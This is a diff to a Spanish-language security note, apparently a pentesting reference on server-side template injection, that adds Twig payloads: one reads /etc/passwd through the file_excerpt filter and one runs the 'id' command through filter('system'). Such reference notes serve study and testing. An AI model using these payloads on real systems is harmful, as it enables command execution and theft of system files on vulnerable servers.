@@ -37,6 +37,14 @@ linked:
 
 ### 💉 Ejecución por Engine
 
+twig 
+```
+{{ _self }}
+{{ "/etc/passwd"|file_excerpt(1,-1) }}
+{{ ['id'] | filter('system') }}
+```
+
+
 ````tabs
 tab: **Jinja2 (Python / Flask)**
 ![[SSTI - Ejecucion por Engine#^ssti-engine-jinja2]]
